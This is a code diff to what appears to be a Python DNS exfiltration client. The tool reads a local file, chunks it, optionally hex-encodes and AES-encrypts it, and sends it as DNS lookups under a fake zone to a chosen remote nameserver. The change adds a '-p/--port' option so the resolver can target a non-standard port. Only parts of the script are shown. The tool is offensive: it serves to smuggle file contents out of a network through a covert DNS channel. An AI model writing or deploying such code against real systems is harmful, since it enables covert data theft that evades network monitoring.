@@ -9,7 +9,7 @@ PAYLOADS_LENGTH = 60
 # Change payload length to allow for a iterator
 PAYLOADS_LENGTH = PAYLOADS_LENGTH - 4
 
-def main(ip, file, identifier, xxd, secret):
+def main(ip, port, file, identifier, xxd, secret):
 
 	with open(file) as to_send:
 		MESSAGE = to_send.readlines()
@@ -29,6 +29,7 @@ def main(ip, file, identifier, xxd, secret):
 	# prepare the dns service
 	my_resolver = dns.resolver.Resolver(configure=False)
 	my_resolver.nameservers = [ip]
+	my_resolver.port = port
 
 	if xxd:
 
@@ -101,6 +102,8 @@ if __name__ == '__main__':
 						action='store_true', help='Set the secret used for the AES encryption')
 	parser.add_option('-d', '--domain', dest='domain', default='fake.io',
 						type='string', help='fake zone to use for generated lookups')
+	parser.add_option('-p', '--port', dest='remote_port', default='53',
+						type='int', help='Remote listening port')
 
 	(options, args) = parser.parse_args()
 
@@ -119,10 +122,11 @@ if __name__ == '__main__':
 		secret = None
 
 	server_ip = options.server
+	server_port = options.remote_port
 	file = options.file
 	identifier = options.ident
 	xxd = options.xxd
 	fake_domain = options.domain
 
 	# kick off the main loop
-	main(server_ip, file, identifier, xxd, secret)
+	main(server_ip, server_port, file, identifier, xxd, secret)
